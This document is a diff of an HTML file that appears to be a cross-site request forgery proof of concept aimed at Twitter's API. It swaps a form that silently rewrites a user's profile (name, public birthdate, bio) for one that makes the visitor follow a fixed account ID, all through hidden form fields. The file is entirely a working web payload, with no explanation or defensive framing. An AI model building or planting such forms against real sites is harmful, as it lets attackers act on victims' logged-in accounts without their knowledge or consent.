@@ -1,15 +1,17 @@
 <html>
 	<body>
-		<form method="POST" action="https://twitter.com/i/api/1.1/account/update_profile.json">
-			<input type="hidden" name="birthdate_day" value="4"/>
-			<input type="hidden" name="birthdate_month" value="3"/>
-			<input type="hidden" name="birthdate_year" value="2001"/>
-			<input type="hidden" name="birthdate_visibility" value="public"/>
-			<input type="hidden" name="birthdate_year_visibility" value="public"/>
-			<input type="hidden" name="displayNameMaxLength" value="50"/>
-			<input type="hidden" name="name" value="Puppeteer%20Legendhax"/>
-			<input type="hidden" name="description" value="test123"/>
-			<input type="hidden" name="location" value=""/>
+		<form method="POST" action="https://twitter.com/i/api/1.1/friendships/create.json">
+			<input type="hidden" name="include_profile_interstitial_type" value="1"/>
+			<input type="hidden" name="include_blocking" value="1"/>
+			<input type="hidden" name="include_blocked_by" value="1"/>
+			<input type="hidden" name="include_followed_by" value="1"/>
+			<input type="hidden" name="include_want_retweets" value="1"/>
+			<input type="hidden" name="include_mute_edge" value="1"/>
+			<input type="hidden" name="include_can_dm" value="1"/>
+			<input type="hidden" name="include_can_media_tag" value="1"/>
+			<input type="hidden" name="include_ext_has_nft_avatar" value="1"/>
+			<input type="hidden" name="skip_status" value="1"/>
+			<input type="hidden" name="user_id" value="34743251"/>
 			<input type="submit" value="Submit">
 		</form>
 	</body>
